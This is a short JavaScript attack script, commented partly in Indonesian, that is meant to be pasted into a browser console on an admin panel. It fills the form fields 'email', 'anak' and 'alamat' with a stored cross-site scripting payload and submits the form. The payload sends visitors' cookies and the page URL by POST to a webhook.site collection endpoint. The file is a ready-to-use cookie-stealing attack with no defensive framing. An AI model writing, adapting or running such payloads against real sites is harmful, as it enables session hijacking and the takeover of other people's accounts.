
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>
fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
    method: "POST",
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        timestamp: new Date().toISOString()
    })
});
</script>`;
    document.getElementById('anak').value = `<script>
fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
    method: "POST",
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        timestamp: new Date().toISOString()
    })
});
</script>`;
    document.getElementById('alamat').value = `<script>
fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
    method: "POST",
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        timestamp: new Date().toISOString()
    })
});
</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
